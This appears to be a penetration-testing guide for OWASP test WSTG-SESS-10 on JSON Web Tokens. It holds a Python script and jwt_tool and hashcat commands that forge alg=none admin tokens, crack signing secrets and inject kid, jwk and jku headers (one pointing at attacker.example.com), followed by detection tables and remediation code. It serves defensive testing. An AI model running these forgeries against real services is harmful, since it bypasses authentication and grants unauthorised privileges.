---
name: wstg-sess-10
description: "Testing JSON Web Tokens (JWT)"
category: session-management
owasp_id: WSTG-SESS-10
version: "1.0.0"
author: cyberstrike-official
tags: [session, cookies, csrf, token, wstg, sess]
tech_stack: []
cwe_ids: []
chains_with: [wstg-sess-01, wstg-sess-02]
prerequisites: [wstg-conf-01, wstg-conf-02]
severity_boost:
  wstg-sess-01: "A forgeable JWT (weak secret / alg=none) lets an attacker mint arbitrary session tokens directly, making the entropy/randomness checks in session schema testing irrelevant (Critical)"
  wstg-sess-02: "A JWT stored without HttpOnly/Secure is worse than typical session cookie theft — the stolen token carries full authorization claims and generally can't be revoked server-side before it expires (High)"
---

# wstg-sess-10

## Test ID

WSTG-SESS-10

## Test Name

Testing JSON Web Tokens

## High-Level Description

JSON Web Tokens (JWT) are widely used for authentication and authorization. Misconfigurations in JWT implementation can lead to authentication bypass, privilege escalation, or information disclosure. This test evaluates the security of JWT generation, validation, and handling.

---

## What to Check

- [ ] Algorithm confusion (none, HS256/RS256)
- [ ] Weak signing secrets
- [ ] Missing signature validation
- [ ] Sensitive data in payload
- [ ] Token expiration (exp claim)
- [ ] Token revocation mechanism
- [ ] Key management

---

## How to Test

### Step 1: Decode and Analyze JWT

```bash
#!/bin/bash
# Decode JWT token
TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"

# Decode header
echo "$TOKEN" | cut -d'.' -f1 | base64 -d 2>/dev/null | jq '.'

# Decode payload
echo "$TOKEN" | cut -d'.' -f2 | base64 -d 2>/dev/null | jq '.'

# Check for:
# - Algorithm used (alg)
# - Sensitive data in payload
# - Expiration (exp)
# - Issuer (iss)
# - Subject (sub)
```

### Step 2: Test Algorithm Confusion

```python
#!/usr/bin/env python3
import base64
import json
import hmac
import hashlib
import requests

class JWTTester:
    def __init__(self, base_url, original_token):
        self.base_url = base_url
        self.original_token = original_token
        self.findings = []

    def decode_jwt(self, token):
        """Decode JWT without verification"""
        parts = token.split('.')
        header = json.loads(self._b64_decode(parts[0]))
        payload = json.loads(self._b64_decode(parts[1]))
        return header, payload

    def _b64_decode(self, data):
        """Base64 URL decode"""
        padding = 4 - len(data) % 4
        data += '=' * padding
        return base64.urlsafe_b64decode(data)

    def _b64_encode(self, data):
        """Base64 URL encode"""
        if isinstance(data, dict):
            data = json.dumps(data, separators=(',', ':'))
        if isinstance(data, str):
            data = data.encode()
        return base64.urlsafe_b64encode(data).decode().rstrip('=')

    def test_none_algorithm(self):
        """Test algorithm none attack"""
        print("[*] Testing 'none' algorithm attack...")

        header, payload = self.decode_jwt(self.original_token)

        # Create token with alg: none
        new_header = {"alg": "none", "typ": "JWT"}
        payload['role'] = 'admin'  # Try privilege escalation

        new_token = f"{self._b64_encode(new_header)}.{self._b64_encode(payload)}."

        # Test with no signature
        response = requests.get(
            f"{self.base_url}/api/protected",
            headers={"Authorization": f"Bearer {new_token}"}
        )

        if response.status_code == 200:
            print("[VULN] Algorithm 'none' accepted!")
            self.findings.append({
                "issue": "Algorithm none bypass",
                "severity": "Critical"
            })

    def test_weak_secret(self):
        """Test for weak signing secrets"""
        print("[*] Testing weak secrets...")

        header, payload = self.decode_jwt(self.original_token)

        if header.get('alg') not in ['HS256', 'HS384', 'HS512']:
            print("[INFO] Not using HMAC algorithm")
            return

        common_secrets = [
            'secret', 'password', '123456', 'key', 'private',
            'changeme', 'admin', 'jwt_secret', 'test',
        ]

        for secret in common_secrets:
            test_token = self._sign_token(header, payload, secret)

            response = requests.get(
                f"{self.base_url}/api/protected",
                headers={"Authorization": f"Bearer {test_token}"}
            )

            if response.status_code == 200:
                print(f"[VULN] Weak secret found: '{secret}'")
                self.findings.append({
                    "issue": f"Weak JWT secret: {secret}",
                    "severity": "Critical"
                })
                return

    def _sign_token(self, header, payload, secret):
        """Sign token with HMAC-SHA256"""
        header_b64 = self._b64_encode(header)
        payload_b64 = self._b64_encode(payload)
        message = f"{header_b64}.{payload_b64}"

        signature = hmac.new(
            secret.encode(),
            message.encode(),
            hashlib.sha256
        ).digest()

        signature_b64 = base64.urlsafe_b64encode(signature).decode().rstrip('=')
        return f"{message}.{signature_b64}"

    def test_signature_validation(self):
        """Test if signature is validated"""
        print("[*] Testing signature validation...")

        # Modify signature
        parts = self.original_token.split('.')
        modified_token = f"{parts[0]}.{parts[1]}.invalid_signature"

        response = requests.get(
            f"{self.base_url}/api/protected",
            headers={"Authorization": f"Bearer {modified_token}"}
        )

        if response.status_code == 200:
            print("[VULN] Invalid signature accepted!")
            self.findings.append({
                "issue": "No signature validation",
                "severity": "Critical"
            })

    def test_expiration(self):
        """Test if expiration is enforced"""
        print("[*] Testing expiration enforcement...")

        header, payload = self.decode_jwt(self.original_token)

        # Create expired token
        import time
        payload['exp'] = int(time.time()) - 3600  # 1 hour ago

        # Would need to sign with valid secret
        # This is a manual check - verify exp claim is present

        if 'exp' not in payload:
            print("[WARN] No expiration claim in token")
            self.findings.append({
                "issue": "Missing expiration claim",
                "severity": "Medium"
            })

    def test_sensitive_data(self):
        """Check for sensitive data in payload"""
        print("[*] Checking for sensitive data in payload...")

        header, payload = self.decode_jwt(self.original_token)

        sensitive_keys = ['password', 'secret', 'ssn', 'credit_card', 'api_key']

        for key in payload:
            if any(s in key.lower() for s in sensitive_keys):
                print(f"[VULN] Sensitive data in payload: {key}")
                self.findings.append({
                    "issue": f"Sensitive data in JWT: {key}",
                    "severity": "Medium"
                })

# Usage
tester = JWTTester("https://target.com", "your_jwt_token")
tester.test_none_algorithm()
tester.test_weak_secret()
tester.test_signature_validation()
tester.test_expiration()
tester.test_sensitive_data()
```

---

## Tools

| Tool         | Description          |
| ------------ | -------------------- |
| **jwt.io**   | JWT decoder          |
| **jwt_tool** | JWT security testing |
| **hashcat**  | Secret brute-forcing |

---

## Example Commands/Payloads

```bash
# Full automated scan (alg confusion, weak secret, known CVEs) with jwt_tool
python3 jwt_tool.py "$TOKEN" -M at -t "https://{target}/api/protected" -rh "Authorization: Bearer "

# alg=none bypass — pre-built tampered token (role escalated, no signature)
python3 jwt_tool.py "$TOKEN" -X a
# manual equivalent: header {"alg":"none","typ":"JWT"} + payload with "role":"admin" + trailing "."

# Weak HMAC secret brute-force
hashcat -a 0 -m 16500 "$TOKEN" /usr/share/wordlists/rockyou.txt
# or: python3 jwt_tool.py "$TOKEN" -C -d common_secrets.txt

# RS256 -> HS256 key-confusion (sign with server's public key as HMAC secret)
python3 jwt_tool.py "$TOKEN" -X k -pk public_key.pem

# kid header injection (path traversal / SQLi via key-lookup)
python3 jwt_tool.py "$TOKEN" -I -hc kid -hv "../../../../dev/null" -S hs256 -p ""
# kid pointing to a predictable-content file (empty HMAC key -> forgeable)
python3 jwt_tool.py "$TOKEN" -I -hc kid -hv "/proc/sys/kernel/randomize_va_space" -S hs256 -p "2"

# Null signature attack (CVE-2020-28042) — HS256 header/payload with an empty signature segment
python3 jwt_tool.py "$TOKEN" -X n
# manual: "<header_b64>.<payload_b64>." (trailing dot, empty 3rd segment)

# Embedded JWK / key injection attack (CVE-2018-0114) — attacker generates own RSA keypair,
# embeds the public half in the header's "jwk" claim, signs with the matching private key
python3 jwt_tool.py "$TOKEN" -X i
# Burp JWT Editor: New RSA Key -> Repeater tab edit claims -> Attack > Embedded JWK

# jku/JWKS header injection — host attacker-controlled JWKS, point jku at it, sign with matching private key
python3 jwt_tool.py "$TOKEN" -X s
python3 jwt_tool.py "$TOKEN" -X s -ju "https://attacker.example.com/jwks.json"
# check for exposed JWKS endpoints first:
for p in jwks.json .well-known/jwks.json openid/connect/jwks.json api/keys api/v1/keys; do
    curl -s -o /dev/null -w "%{http_code} $p\n" "https://{target}/$p"
done

# Recover RSA public key from two JWTs signed with the same RS256/384/512 key
docker run -it ttervoort/jws2pubkey "$JWT_1" "$JWT_2"

# Signature-disclosure oracle (CVE-2019-7644) — send a malformed signature and check
# if the error message leaks the expected value ("Invalid signature. Expected ... got ...")
python3 jwt_tool.py "$TOKEN" -X n | grep -i "expected"

# Full end-to-end recon -> scan -> exploit -> fuzz workflow against a live endpoint
python3 jwt_tool.py -t "https://{target}/" -rc "jwt=$TOKEN" -M pb
python3 jwt_tool.py -t "https://{target}/" -rc "jwt=$TOKEN" -X i -I -pc role -pv admin
python3 jwt_tool.py -t "https://{target}/" -rc "jwt=$TOKEN" -I -hc kid -hv custom_sqli_vectors.txt

# Hashcat rule-based and pure brute-force cracking (in addition to plain dictionary)
hashcat -a 0 -m 16500 "$TOKEN" /usr/share/wordlists/rockyou.txt -r rules/best64.rule
hashcat -a 3 -m 16500 "$TOKEN" ?u?l?l?l?l?l?l?l -i --increment-min=6

# Known public JWT secrets list (3500+ entries, e.g. your_jwt_secret, change_this_super_secret_random_string)
python3 jwt_tool.py "$TOKEN" -d jwt.secrets.list -C
```

| Detection Pattern | Meaning |
| --- | --- |
| Request with `alg: none` + no signature returns 200 | [VULN] Algorithm confusion — auth bypass |
| HS256 token with header/payload intact but empty signature segment (`....`) accepted | [VULN] Null signature attack, CVE-2020-28042 |
| Token re-signs successfully with a common wordlist secret | [VULN] Weak HMAC secret, Critical |
| Response accepts a token signed with the server's own RSA public key as HMAC secret | [VULN] alg confusion (RS256→HS256) |
| Tampered `kid` value reflected/executed server-side | [VULN] kid injection (LFI/SQLi) |
| Token signed with attacker's own key + embedded `jwk`/`jku` header is accepted | [VULN] Key/JWKS injection, CVE-2018-0114 |
| Invalid-signature error response echoes the expected signature value | [VULN] Signature disclosure oracle, CVE-2019-7644 |
| Modified `exp`/`role` claim accepted after re-signing with guessed/leaked secret | [VULN] Privilege escalation via JWT |

---

## Remediation Guide

### Secure JWT Implementation

```python
import jwt
from datetime import datetime, timedelta

# Use strong secret (256+ bits)
SECRET_KEY = os.environ.get('JWT_SECRET')  # Should be cryptographically random

def create_token(user_id, role):
    payload = {
        'sub': str(user_id),
        'role': role,
        'iat': datetime.utcnow(),
        'exp': datetime.utcnow() + timedelta(hours=1),
        'jti': secrets.token_hex(16)  # Unique token ID
    }

    return jwt.encode(payload, SECRET_KEY, algorithm='HS256')

def verify_token(token):
    try:
        payload = jwt.decode(
            token,
            SECRET_KEY,
            algorithms=['HS256']  # Explicit algorithm
        )
        return payload
    except jwt.ExpiredSignatureError:
        raise AuthError("Token expired")
    except jwt.InvalidTokenError:
        raise AuthError("Invalid token")
```

---

## Risk Assessment

| Finding                   | CVSS | Severity |
| ------------------------- | ---- | -------- |
| Algorithm none bypass     | 9.8  | Critical |
| Weak secret               | 9.8  | Critical |
| No signature validation   | 9.8  | Critical |
| Missing expiration        | 5.3  | Medium   |
| Sensitive data in payload | 5.3  | Medium   |

---

## CWE Categories

| CWE ID      | Title                                                 |
| ----------- | ----------------------------------------------------- |
| **CWE-347** | Improper Verification of Cryptographic Signature      |
| **CWE-757** | Selection of Less-Secure Algorithm During Negotiation |

---

## References

- [OWASP JSON Web Token Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- [jwt.io Debugger](https://jwt.io/)
- [RFC 7519 - JSON Web Token](https://tools.ietf.org/html/rfc7519)
- [PortSwigger - JWT Attacks](https://portswigger.net/web-security/jwt)
- [PayloadsAllTheThings - JSON Web Token](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token)


---

## Checklist

```
[ ] JWT structure analyzed
[ ] Algorithm none tested
[ ] Weak secrets tested
[ ] Signature validation tested
[ ] Expiration checked
[ ] Sensitive data checked
[ ] Findings documented
```
